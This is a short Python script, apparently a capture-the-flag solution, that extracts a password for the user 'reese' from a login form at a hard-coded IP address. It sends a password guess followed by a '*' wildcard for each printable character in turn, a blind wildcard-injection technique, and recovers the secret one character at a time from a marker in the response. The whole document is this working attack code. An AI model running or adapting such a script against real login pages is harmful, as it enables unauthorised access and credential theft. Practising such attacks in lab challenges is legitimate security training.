import requests
url = 'http://178.128.35.180:30729/login'
flag =[]
def brutePsw():
    startChar, endChar = 40, 125
    while startChar <= endChar:
        password = ''.join(flag)
        creds = {'username':'reese','password':password + chr(startChar)+'*'}
        login = requests.post(url=url, data=creds)
        if ('search(this)' in login.text) and (startChar != 42):
            flag.append(chr(startChar))
            brutePsw()
        else:
            startChar += 1
brutePsw()
print(*flag, sep='')
